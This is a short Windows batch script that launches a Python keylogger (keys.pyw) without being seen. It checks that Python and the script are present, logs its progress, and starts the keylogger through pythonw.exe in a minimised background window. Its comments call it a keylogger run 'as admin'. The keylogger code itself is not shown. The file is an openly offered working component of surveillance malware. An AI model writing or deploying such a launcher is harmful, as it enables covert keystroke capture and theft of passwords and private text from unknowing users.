@echo off
:: Set working directory to where the .bat file is located
cd /d "%~dp0"

:: Log to a file for debugging
echo %DATE% %TIME% - Starting the keylogger script >> "%~dp0log.txt"

:: Check if Python is installed
python --version >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Python is not installed or not in the PATH. Please install Python first. >> "%~dp0log.txt"
    exit /b
)

:: Check if the Python script (keys.pyw) exists in the current directory
IF NOT EXIST "%~dp0keys.pyw" (
    echo Error: keys.pyw not found in the current directory. >> "%~dp0log.txt"
    exit /b
)

:: Run the Python script in the background using pythonw.exe
echo Running the keylogger script as admin... >> "%~dp0log.txt"
start "" /min pythonw "%~dp0keys.pyw" >> "%~dp0log.txt" 2>&1
exit
